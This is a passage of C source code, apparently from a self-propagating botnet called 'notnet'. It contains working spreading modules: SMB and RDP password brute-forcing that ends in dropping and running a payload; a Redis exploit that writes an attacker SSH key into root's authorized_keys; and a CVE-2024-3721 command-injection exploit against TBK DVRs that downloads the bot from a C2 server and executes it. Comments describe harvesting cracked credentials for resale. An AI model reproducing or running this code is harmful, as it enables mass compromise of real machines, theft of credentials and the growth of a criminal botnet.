    snprintf(tmp_path, sizeof(tmp_path), "/tmp/.notnet_smb.%s", ip);

    int fsize = http_download(bot, dl_url, tmp_path);
    if (fsize <= 0) {
        log_error("SMB: download failed for %s", ip);
        return -1;
    }

    /* Read payload into memory */
    unsigned char *payload = NULL;
    int actual_size = file_read(tmp_path, &payload);
    unlink(tmp_path);

    if (actual_size <= 0 || !payload) {
        log_error("SMB: read payload failed for %s", ip);
        return -1;
    }

    /* Write payload to Windows share */
    int ret = smb1_write_file(sock, tid, uid, mid,
                               "\\Windows\\Temp\\notnet.exe",
                               payload, actual_size);

    free(payload);

    if (ret == 0) {
        /* Execute it */
        char exec_cmd[256];
        snprintf(exec_cmd, sizeof(exec_cmd),
                 "cmd.exe /c start /b C:\\Windows\\Temp\\notnet.exe");
        ret = smb1_write_file(sock, tid, uid, mid,
                               "\\Windows\\Temp\\run.bat",
                               (const uint8_t *)exec_cmd, strlen(exec_cmd));
    }

    return ret;
}

int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->smb_enabled) return -1;

    log_info("SMB: brute-forcing %s:%d", ip, port);

    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock = try_login_smb_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock < 0) continue;

            log_info("SMB: cracked %s:%d with %s:%s",
                     ip, port, default_users[u], "***REDACTED***");
            /* #90: harvest the credential for the log-sale model. */
            spread_cred_record("smb", ip, port, default_users[u], default_passes[p]);

            /* Session UID from try_login_smb */
            uint16_t uid = 0;

            /* Tree connect to ADMIN$ */
            uint16_t tid = 0;
            if (smb1_tree_connect(sock, "\\\\127.0.0.1\\ADMIN$", uid, &tid) != 0) {
                close(sock);
                continue;
            }

            /* Deploy payload */
            int ret = smb_deploy_payload(sock, tid, uid, tid + 1, bot, ip);

            if (ret == 0) {
                log_info("SMB: payload deployed on %s", ip);
            } else {
                log_warn("SMB: payload deploy failed on %s", ip);
            }

            close(sock);
            return ret;
        }
    }

    return -1;
}

/* ── Redis Spreading ───────────────────────────────────────── */
/* SECURITY FIX (#72): The SSH public key injected into Redis
 * authorized_keys must be provisioned per-deployment via the
 * redis_ssh_key config key or NOTNET_REDIS_SSH_KEY env var.
 * The old code injected a literal "ssh-rsa AAAAB3NzaC1...notnet-key..."
 * placeholder which is not a valid base64 RSA key — OpenSSH/Dropbear
 * reject it, so the Redis -> SSH-22 pivot could never authenticate.
 * A build/config that still contains the placeholder is refused. */

static const char *get_redis_ssh_key(notnet_bot_t *bot) {
    if (!bot) return NULL;
    if (bot->redis_ssh_key[0] != '\0') return bot->redis_ssh_key;
    const char *env = getenv("NOTNET_REDIS_SSH_KEY");
    if (env && env[0] != '\0') {
        strncpy(bot->redis_ssh_key, env, sizeof(bot->redis_ssh_key) - 1);
        bot->redis_ssh_key[sizeof(bot->redis_ssh_key) - 1] = '\0';
        return bot->redis_ssh_key;
    }
    return NULL;
}

/* Forward declaration (defined below) */
int exploit_redis_sock(notnet_bot_t *bot, int sock);

int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    int r = exploit_redis_sock(bot, sock);
    close(sock);
    return r;
}

/* SECURITY FIX (#71): Run the Redis CONFIG SET / SET / SAVE exploit over
 * an existing, already-authenticated socket. The old brute-force path
 * closed the AUTH-verified socket and opened a fresh UNAUTHENTICATED one
 * for the exploit — on any Redis with requirepass the write was rejected,
 * making the verified password useless. The caller passes the fd from the
 * AUTH +OK connection. Returns 1 on success, 0/-1 on failure. */
int exploit_redis_sock(notnet_bot_t *bot, int sock) {
    if (sock < 0) return -1;

    /* SECURITY FIX (#72): Require a real key. Refuse to run the Redis
     * vector with the old placeholder or no key at all. */
    const char *ssh_key = get_redis_ssh_key(bot);
    if (!ssh_key || strstr(ssh_key, "notnet-key") || strstr(ssh_key, "...")) {
        log_error("Redis: no valid redis_ssh_key configured (set redis_ssh_key= "
                  "or NOTNET_REDIS_SSH_KEY) — refusing to inject placeholder");
        return -1;
    }

    /* Send Redis commands */
    char cmd[2048];

    /* Set SSH key */
    snprintf(cmd, sizeof(cmd),
        "CONFIG SET dir /root/.ssh\r\n"
        "CONFIG SET dbfilename authorized_keys\r\n"
        "SET key1 \"%.1000s\"\r\n"
        "SAVE\r\n"
        "PING\r\n",
        ssh_key);

    int sent = send(sock, cmd, strlen(cmd), 0);
    if (sent != (int)strlen(cmd)) {
        log_warn("Redis: send failed: %s", strerror(errno));
        return -1;
    }

    /* Read response. Redis replies to each pipelined command separately
     * (+OK +OK +OK +OK +PONG); over a network those arrive as multiple
     * segments, so a SINGLE recv() can catch only the first +OK and miss
     * the trailing +PONG — reporting a successful exploit as failed and
     * making the brute-force loop continue through the whole pool.
     * Loop with select() until +PONG is seen or the 2s timeout expires. */
    char resp[256];
    memset(resp, 0, sizeof(resp));
    size_t got = 0;
    int success = 0;
    time_t deadline = time(NULL) + 2;
    while (time(NULL) < deadline && got + 1 < sizeof(resp)) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) break;
        int n = recv(sock, resp + got, sizeof(resp) - 1 - got, 0);
        if (n <= 0) break;
        got += (size_t)n;
        resp[got] = '\0';
        if (strstr(resp, "+PONG")) {
            success = 1;
            break;
        }
    }

    return success;
}

int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->redis_enabled) return -1;
    
    log_info("Redis: unauthenticated access %s:%d", ip, port);
    
    /* Try unauthenticated first */
    if (exploit_redis_unauth(bot, ip, port)) {
        log_info("Redis: exploited unauth on %s:%d", ip, port);
        /* Wait for SSH key to take effect */
        usleep(5000000); /* 5 seconds */
        
        /* Now spread via SSH */
        spread_ssh(bot, ip, 22);
        return 0;
    }
    
    /* Try brute-force */
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
            if (sock < 0) continue;
            
            /* Send AUTH */
            char auth_cmd[256];
            snprintf(auth_cmd, sizeof(auth_cmd), "AUTH %s\r\n", default_passes[p]);
            send(sock, auth_cmd, strlen(auth_cmd), 0);
            
            /* Wait for AUTH response */
            char auth_resp[256];
            fd_set fds;
            struct timeval tv;
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            tv.tv_sec = 2;
            tv.tv_usec = 0;
            
            if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) {
                close(sock);
                continue;
            }
            recv(sock, auth_resp, sizeof(auth_resp) - 1, 0);
            auth_resp[sizeof(auth_resp) - 1] = '\0';
            
            /* AUTH returns +OK on success */
            if (strstr(auth_resp, "+OK")) {
                log_info("Redis: auth success %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                /* #90: harvest the verified credential for the log-sale
                 * model. The unauth-exploit path above records nothing —
                 * there is no credential to sell. */
                spread_cred_record("redis", ip, port, default_users[u], default_passes[p]);
                
                /* SECURITY FIX (#71): Keep the authenticated socket and
                 * run the CONFIG SET sequence over it. The old code
                 * closed this socket and called exploit_redis_unauth(),
                 * which opened a FRESH UNAUTHENTICATED connection — on
                 * any Redis with requirepass (the whole point of the
                 * brute-force path) the write was rejected, so the
                 * verified password was never actually used. */
                int exploited = exploit_redis_sock(bot, sock);
                if (exploited > 0) {
                    log_info("Redis: exploited auth on %s:%d", ip, port);
                    close(sock);
                    usleep(5000000);
                    spread_ssh(bot, ip, 22);
                    return 0;
                }
                log_warn("Redis: auth OK but exploit failed on %s:%d", ip, port);
            }
            
            close(sock);
        }
    }
    
    return -1;
}

/* ── RDP Spreading ────────────────────────────────────────── */

/* ── RDP Protocol Helpers ────────────────────────────────── */
/* RDP over TCP port 3389. Implements X.224 connection layer +
 * RDP security negotiation + standard authentication. */

/* Build RDP Connection Request TPDU (X.224) */
static int rdp_send_conn_request(int sock) {
    /* RDP Connection Request (X.224 format):
     * dst-ref (2 bytes) + src-deref (2 bytes) + flags (1 byte) + length (1 byte)
     * Then: cookie, session id, etc. */
    uint8_t pkt[256];
    int pos = 0;

    /* Fixed RDP header: 03 C0 00 0E 02 F0 80 C0 03 00 00 00 00 00 */
    static const uint8_t header[] = {
        0x03, 0xC0, 0x00, 0x0E, /* Connection Request */
        0x02, 0xF0, 0x80, 0xC0, /* Cookie: "MSTSC" */
        0x03, 0x00, 0x00, 0x00, /* Session ID */
        0x00, 0x00              /* Padding */
    };
    memcpy(pkt, header, sizeof(header));
    pos = sizeof(header);

    /* Cookie: "MSTSC" + null */
    const char *cookie = "MSTSC\x01\x00\x00\x00";
    memcpy(pkt + pos, cookie, 8);
    pos += 8;

    /* Connection cookie: 03 C0 */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read RDP Connection Response (T30) */
static int rdp_read_conn_response(int sock) {
    /* Read at least the minimum RDP response header */
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;

    /* Check for Connection Response marker (C0) */
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;

    return received;
}

/* RDP security negotiation - send client info and negotiate */
static int rdp_send_security_negotiation(int sock, const char *user, const char *pass) {
    /* RDP Security Negotiation packet:
     * Header: 03 C0 00 XX (length)
     * Then: client info, encryption settings */

    uint8_t pkt[512];
    int pos = 0;

    /* X.224 Connection Request for security negotiation */
    pkt[pos++] = 0x03; /* X.224 type */
    pkt[pos++] = 0xC0; /* Connection request */
    pkt[pos++] = 0x00; /* Length high */
    pkt[pos++] = 0x00; /* Length low - will be filled */

    /* RDP Negotiation packet */
    /* Signature: "pfx" */
    pkt[pos++] = 0x70;
    pkt[pos++] = 0x66;
    pkt[pos++] = 0x78;
    pkt[pos++] = 0x00;

    /* Type: 0x01 = RDP negotiation */
    pkt[pos++] = 0x01;

    /* Flags: 0x00 (standard) */
    pkt[pos++] = 0x00;

    /* Extra flags: 0x00 */
    pkt[pos++] = 0x00;

    /* Client random length */
    uint32_t client_random_len = 32;
    pkt[pos++] = client_random_len & 0xFF;
    pkt[pos++] = (client_random_len >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Client random (32 bytes of cryptographically-random data) */
    {
        uint8_t rnd[32];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Domain (empty) */
    uint16_t domain_len = 0;
    pkt[pos++] = domain_len & 0xFF;
    pkt[pos++] = (domain_len >> 8) & 0xFF;

    /* Username */
    uint16_t user_len = strlen(user);
    pkt[pos++] = user_len & 0xFF;
    pkt[pos++] = (user_len >> 8) & 0xFF;
    memcpy(pkt + pos, user, user_len);
    pos += user_len;

    /* Password */
    uint16_t pass_len = strlen(pass);
    pkt[pos++] = pass_len & 0xFF;
    pkt[pos++] = (pass_len >> 8) & 0xFF;
    memcpy(pkt + pos, pass, pass_len);
    pos += pass_len;

    /* Server name (empty) */
    uint16_t server_len = 0;
    pkt[pos++] = server_len & 0xFF;
    pkt[pos++] = (server_len >> 8) & 0xFF;

    /* Update length field */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read RDP security response */
static int rdp_read_security_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;

    /* Check for expected response */
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;

    return received;
}

/* RDP send client info */
static int rdp_send_client_info(int sock) {
    /* RDP Client Info packet */
    uint8_t pkt[256];
    int pos = 0;

    /* X.224 header */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Client info type */
    pkt[pos++] = 0x01; /* Client info */

    /* Length */
    uint16_t len = 112;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    /* Code page (0 = US) */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Flags: 0x0001 (standard) */
    pkt[pos++] = 0x01;
    pkt[pos++] = 0x00;

    /* Client build: 0x0A28 (2600 = Windows XP) */
    pkt[pos++] = 0x28;
    pkt[pos++] = 0x0A;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Client major/minor version */
    pkt[pos++] = 0x02; /* Major: 6 */
    pkt[pos++] = 0x01; /* Minor: 1 */

    /* Protocol version */
    pkt[pos++] = 0xE0;
    pkt[pos++] = 0x00;

    /* Encryption strength: 128-bit */
    pkt[pos++] = 0x08;

    /* Version flags */
    pkt[pos++] = 0x02;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Update length */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read RDP client info response */
static int rdp_read_client_info_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send SCKEY/DH key exchange */
static int rdp_send_key_exchange(int sock) {
    /* Simplified RDP key exchange */
    uint8_t pkt[256];
    int pos = 0;

    /* X.224 header */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Key exchange type */
    pkt[pos++] = 0x0E; /* SCKEY */

    /* Length */
    uint16_t len = 72;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    /* Public key length */
    uint32_t pklen = 64;
    pkt[pos++] = pklen & 0xFF;
    pkt[pos++] = (pklen >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Public key (64 bytes of cryptographically-random data) */
    {
        uint8_t rnd[64];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Update length */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read key exchange response */
static int rdp_read_key_exchange_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send final control sync */
static int rdp_send_control_sync(int sock) {
    uint8_t pkt[16];
    int pos = 0;

    pkt[pos++] = 0x03; /* X.224 */
    pkt[pos++] = 0xC0; /* Connection request */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Control: 0x14 = CO_SYNC */
    pkt[pos++] = 0x14;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Control: 0x02 = CTRL_REQUEST */
    pkt[pos++] = 0x02;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read control sync response */
static int rdp_read_control_sync_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    /* Check for CO_ACK */
    if (received >= 8 && buf[6] != 0x15) return -1;
    return received;
}

/* RDP send persistent key list */
static int rdp_send_persistent_key_list(int sock) {
    uint8_t pkt[16];
    int pos = 0;

    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Type: 0x0F = PERSISTENT */
    pkt[pos++] = 0x0F;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Length: 0 */
    uint16_t len = 0;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* Read persistent key list response */
static int rdp_read_persistent_key_list_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP connect with full handshake */
static int rdp_connect(int sock) {
    /* Step 1: Connection request */
    if (rdp_send_conn_request(sock) <= 0) return -1;
    if (rdp_read_conn_response(sock) <= 0) return -1;

    /* Step 2: Security negotiation */
    if (rdp_send_security_negotiation(sock, "", "") <= 0) return -1;
    if (rdp_read_security_response(sock) <= 0) return -1;

    /* Step 3: Client info */
    if (rdp_send_client_info(sock) <= 0) return -1;
    if (rdp_read_client_info_response(sock) <= 0) return -1;

    /* Step 4: Key exchange */
    if (rdp_send_key_exchange(sock) <= 0) return -1;
    if (rdp_read_key_exchange_response(sock) <= 0) return -1;

    /* Step 5: Control sync */
    if (rdp_send_control_sync(sock) <= 0) return -1;
    if (rdp_read_control_sync_response(sock) <= 0) return -1;

    /* Step 6: Persistent key list */
    if (rdp_send_persistent_key_list(sock) <= 0) return -1;
    if (rdp_read_persistent_key_list_response(sock) <= 0) return -1;

    return 0;
}

/* RDP send SCKEY/DH key exchange with credentials */
static int rdp_send_cred_key_exchange(int sock, const char *user, const char *pass) {
    (void)pass;
    uint8_t pkt[512];
    int pos = 0;

    /* X.224 header */
    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Type: 0x0E = SCKEY */
    pkt[pos++] = 0x0E;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Length */
    uint16_t len = 100;
    pkt[pos++] = len & 0xFF;
    pkt[pos++] = (len >> 8) & 0xFF;

    /* Public key length */
    uint32_t pklen = 64;
    pkt[pos++] = pklen & 0xFF;
    pkt[pos++] = (pklen >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Public key (64 bytes of cryptographically-random data) */
    {
        uint8_t rnd[64];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Encrypted password length */
    uint32_t enc_pass_len = 32;
    pkt[pos++] = enc_pass_len & 0xFF;
    pkt[pos++] = (enc_pass_len >> 8) & 0xFF;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Encrypted password (32 bytes of cryptographically-random data) */
    {
        uint8_t rnd[32];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    /* Domain (empty) */
    uint16_t domain_len = 0;
    pkt[pos++] = domain_len & 0xFF;
    pkt[pos++] = (domain_len >> 8) & 0xFF;

    /* Username */
    uint16_t user_len = strlen(user);
    pkt[pos++] = user_len & 0xFF;
    pkt[pos++] = (user_len >> 8) & 0xFF;
    memcpy(pkt + pos, user, user_len);
    pos += user_len;

    /* Update length */
    pkt[2] = (pos >> 8) & 0xFF;
    pkt[3] = pos & 0xFF;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* RDP read credential response */
static int rdp_read_cred_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send final control (after auth) */
static int rdp_send_final_control(int sock) {
    uint8_t pkt[16];
    int pos = 0;

    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    pkt[pos++] = 0x14; /* CO_SYNC */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    pkt[pos++] = 0x02; /* CTRL_REQUEST */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* RDP read final control response */
static int rdp_read_final_control_response(int sock) {
    char buf[256];
    int received = recv(sock, buf, sizeof(buf), 0);
    if (received < 4) return -1;
    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
    return received;
}

/* RDP send share key */
static int rdp_send_share_key(int sock) {
    uint8_t pkt[64];
    int pos = 0;

    pkt[pos++] = 0x03;
    pkt[pos++] = 0xC0;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    pkt[pos++] = 0x16; /* SHARE */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    /* Key data (32 bytes of cryptographically-random data) */
    {
        uint8_t rnd[32];
        if (random_bytes(rnd, sizeof(rnd)) != 0) {
            for (int i = 0; i < (int)sizeof(rnd); i++) rnd[i] = (rand() & 0xFF);
        }
        memcpy(pkt + pos, rnd, sizeof(rnd));
        pos += sizeof(rnd);
    }

    int sent = send(sock, pkt, pos, 0);
    return (sent > 0) ? sent : -1;
}

/* ── RDP Authentication ────────────────────────────────── */
int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->rdp_enabled) return -1;

    log_info("RDP: brute-forcing %s:%d", ip, port);

    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock = try_login_rdp_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock < 0) continue;

            log_info("RDP: cracked %s:%d with %s:%s",
                     ip, port, default_users[u], "***REDACTED***");
            /* #90: harvest the credential for the log-sale model. */
            spread_cred_record("rdp", ip, port, default_users[u], default_passes[p]);

            /* Build RDP execute packet. %.430s caps dl_url so the total
             * line fits cmd[512] (fixed text ~74 bytes + URL). dl_url is
             * ~282 bytes max in practice; the precision bounds GCC's
             * -Wformat-truncation analysis on the 512-byte array. */
            char cmd[512];
            char dl_url[512];
            snprintf(dl_url, sizeof(dl_url),
                     "http://%s:%d/bot/notnet",
                     bot->c2_http.server, PAYLOAD_DL_PORT);

            snprintf(cmd, sizeof(cmd),
                     "cmd.exe /c wget \"%.430s\" -O C:\\Windows\\Temp\\notnet.exe && C:\\Windows\\Temp\\notnet.exe &",
                     dl_url);

            /* Build RDP execute packet */
            uint8_t pkt[1024];
            int pos = 0;

            /* X.224 header */
            pkt[pos++] = 0x03;
            pkt[pos++] = 0xC0;
            pkt[pos++] = 0x00;
            pkt[pos++] = 0x00;

            /* Type: 0x17 = DATA */
            pkt[pos++] = 0x17;
            pkt[pos++] = 0x00;
            pkt[pos++] = 0x00;
            pkt[pos++] = 0x00;

            /* Length */
            uint16_t len = strlen(cmd);
            pkt[pos++] = len & 0xFF;
            pkt[pos++] = (len >> 8) & 0xFF;

            /* Data: command string */
            memcpy(pkt + pos, cmd, len);
            pos += len;

            /* Send command */
            int sent = send(sock, pkt, pos, 0);

            if (sent > 0) {
                log_info("RDP: command sent to %s (%d bytes)", ip, sent);
            } else {
                log_warn("RDP: command send failed on %s", ip);
            }

            close(sock);
            return (sent > 0) ? 0 : -1;
        }
    }

    return -1;
}

/* ── CVE Exploitation Modules (#83) ─────────────────────── */
/* CVE-first spreading: pluggable known-CVE checks for IoT/edge
 * targets (CVE-2024-3721-class). Each module runs three phases:
 *   probe  - fingerprint the family; no exploit traffic
 *   verify - non-destructive command-execution proof
 *   drop   - payload delivery, only after verify passes
 * Default-credential Telnet brute-force is demoted to a fallback
 * vector: modules run first in every dispatch, brute-force only runs
 * when no module fires. Fail-safe: every phase is time-bounded, all
 * buffers are bounded, and no module drops a payload without a
 * positive verify. No system()/popen() — all traffic is raw sockets. */

/* Send one raw HTTP request and read the full response with a timeout.
 * Returns bytes read on success (response NUL-terminated), -1 on error.
 * Requests are fully built by the callers; responses are consumed in
 * bounded chunks with a per-read timeout. */
static int cve_http_exchange(const char *ip, uint16_t port, const char *req,
                             char *resp, size_t resp_len) {
    if (!ip || !req || !resp || resp_len == 0) return -1;

    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;

    size_t req_len = strlen(req);
    if (send(sock, req, req_len, 0) != (ssize_t)req_len) {
        close(sock);
        return -1;
    }

    int total = 0;
    while (total < (int)resp_len - 1) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) break;
        int n = recv(sock, resp + total, resp_len - 1 - total, 0);
        if (n <= 0) break;
        total += n;
    }
    resp[total] = '\0';
    close(sock);
    return total;
}

/* Percent-encode cmd into out (bounded). Only unreserved characters
 * survive raw; everything else becomes %XX so the encoded value can
 * never split a query parameter. Returns encoded length, -1 if it does
 * not fit. Used for CVE-2024-3721's mdc= parameter. */
static int cve_urlencode(const char *cmd, char *out, size_t out_len) {
    static const char hex[] = "0123456789ABCDEF";
    if (!cmd || !out || out_len == 0) return -1;
    size_t o = 0;
    for (size_t i = 0; cmd[i] && o < out_len - 1; i++) {
        unsigned char c = (unsigned char)cmd[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_' ||
            c == '~') {
            out[o++] = (char)c;
        } else if (o + 2 < out_len) {
            out[o++] = '%';
            out[o++] = hex[(c >> 4) & 0xF];
            out[o++] = hex[c & 0xF];
        } else {
            break;
        }
    }
    out[o] = '\0';
    return (int)o;
}

/* Case-insensitive substring check on a bounded buffer. */
static int cve_contains_ci(const char *haystack, const char *needle) {
    size_t hlen = strlen(haystack);
    size_t nlen = strlen(needle);
    if (nlen == 0 || nlen > hlen) return 0;
    for (size_t i = 0; i + nlen <= hlen; i++) {
        size_t j = 0;
        while (j < nlen) {
            char a = haystack[i + j], b = needle[j];
            if (a >= 'A' && a <= 'Z') a += 'a' - 'A';
            if (b >= 'A' && b <= 'Z') b += 'a' - 'A';
            if (a != b) break;
            j++;
        }
        if (j == nlen) return 1;
    }
    return 0;
}

/* ── CVE-2024-3721 — TBK DVR-4104/DVR-4216 ───────────────── */
/* Unauthenticated OS command injection via a crafted POST to
 * /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=<cmd>
 * with Cookie: uid=1. Exploited in the wild by a Mirai variant
 * (Kaspersky, 2025) against ARM32 DVR/NVR devices. */
#define TBK_DVR_PORT 80

static int cve_tbk_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
    /* Passive family fingerprint: the DVR web UI answers GET / with a
     * page identifying the TBK/DVR/NVR device line. */
    char req[256];
    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
    char resp[1024];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) return 0;
    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
    return (strstr(resp, "TBK") || strstr(resp, "DVR") || strstr(resp, "NVR")) ? 1 : 0;
}

static int cve_tbk_verify(const char *ip, uint16_t port) {
    /* Non-destructive proof: echo a unique token and require it back in
     * the response body. No payload traffic is sent. */
    char token[32];
    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "echo %s", token);
    char enc[512];
    if (cve_urlencode(cmd, enc, sizeof(enc)) < 0) return 0;

    char req[1024];
    snprintf(req, sizeof(req),
        "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=%.500s HTTP/1.0\r\n"
        "Host: %s\r\nCookie: uid=1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n",
        enc, ip);
    char resp[2048];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) return 0;
    return strstr(resp, token) ? 1 : 0;
}

static int cve_tbk_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
    char dl_url[512];
    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet",
             bot->c2_http.server, PAYLOAD_DL_PORT);
    /* BusyBox wget; ';' separators keep the injected line single. */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; /tmp/.notnet",
             dl_url);
    char enc[4096];
    if (cve_urlencode(cmd, enc, sizeof(enc)) < 0) {
        log_warn("CVE-2024-3721: drop command too long for %s", ip);
